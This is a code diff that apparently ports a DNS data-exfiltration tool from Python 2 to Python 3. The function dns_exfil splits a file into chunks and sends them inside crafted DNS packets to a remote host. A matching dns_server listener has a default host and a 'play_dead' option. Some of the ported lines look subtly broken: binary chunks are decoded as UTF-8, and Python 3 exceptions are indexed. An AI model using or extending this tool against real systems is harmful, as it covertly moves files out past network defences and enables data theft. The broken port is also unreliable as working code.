@@ -85,19 +85,19 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 	head, tail = os.path.split(path_to_file)                                       # Get filename
 	dns_request += INITIATION_STRING + tail + DELIMITER + str(checksum) + NULL              # Extra data goes here
 	addr = (host, port)             # build address to send to
-	s.sendto(dns_request, addr)
+	s.sendto(dns_request.encode('utf-8'), addr)
 	# Sending actual file:
 	chunks = [exfil_me[i:i + max_packet_size] for i in range(0, len(exfil_me), max_packet_size)]  # Split into chunks
 	for chunk in chunks:
 		dns_request = build_dns(host)
-		dns_request += chunk + DATA_TERMINATOR
-		s.sendto(dns_request, addr)
+		dns_request += chunk.decode('utf-8') + DATA_TERMINATOR
+		s.sendto(dns_request.encode('utf-8'), addr)
 		time.sleep(time_delay)
 
 	# Send termination packet:
 	dns_request = build_dns(host)
 	dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR
-	s.sendto(dns_request, addr)
+	s.sendto(dns_request.encode('utf-8'), addr)
 	
 	return 0
 
@@ -115,14 +115,14 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 	# Try opening socket and listen
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	except socket.error, msg :
+	except (socket.error) as msg :
 		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
 		raise
 
 	# Try binding to the socket
 	try:
 		s.bind((host, port))
-	except socket.error, msg:
+	except (socket.error) as msg:
 		sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
 		raise
 
